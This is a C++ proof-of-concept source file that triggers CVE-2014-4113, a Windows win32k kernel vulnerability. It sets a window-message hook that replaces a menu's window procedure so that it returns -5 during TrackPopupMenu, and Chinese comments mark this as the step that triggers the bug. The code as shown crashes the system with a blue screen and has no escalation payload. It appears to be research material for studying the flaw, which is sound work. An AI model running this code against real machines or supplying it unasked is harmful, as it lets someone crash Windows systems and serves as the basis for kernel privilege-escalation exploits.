#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

LRESULT CALLBACK WinSunProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK NewMenuProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	return 0x00000000fffffffb;  //触发漏洞
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *ptag = (CWPSTRUCT*)lParam;
	if (ptag->message == 0x1eb)
	{
		SetWindowLongPtr(ptag->hwnd, GWLP_WNDPROC, (LONG_PTR)NewMenuProc);
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hInstance = ::GetModuleHandle(NULL);

	WNDCLASS wndcls = { 0 };
	wndcls.hInstance = hInstance;
	wndcls.lpfnWndProc = WinSunProc;
	wndcls.lpszClassName = "CVE-2014-4113";

	RegisterClassA(&wndcls);

	HWND hwnd = CreateWindowA(wndcls.lpszClassName, "CVE-2014-4113", WS_OVERLAPPEDWINDOW, 0, 0, 800, 800, NULL, NULL, wndcls.hInstance, NULL);

	HMENU popup_menu1 = CreatePopupMenu();
	HMENU popup_menu2 = CreatePopupMenu();		//这里还需要一个 PopupMenu
	AppendMenu(popup_menu2, MF_STRING, 0, "for spwndNextPopup");	//给PopupMenu随便添加个菜单项 （不能没有菜单项）
	AppendMenu(popup_menu1, MF_STRING | MF_POPUP, (UINT_PTR)popup_menu2, "BSOD");  //给它一个 spwndNextPopup 指针

	SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());

	BOOL ret = TrackPopupMenu(popup_menu1, TPM_RIGHTBUTTON, 0, 0, 0, hwnd, 0);

	return 0;
}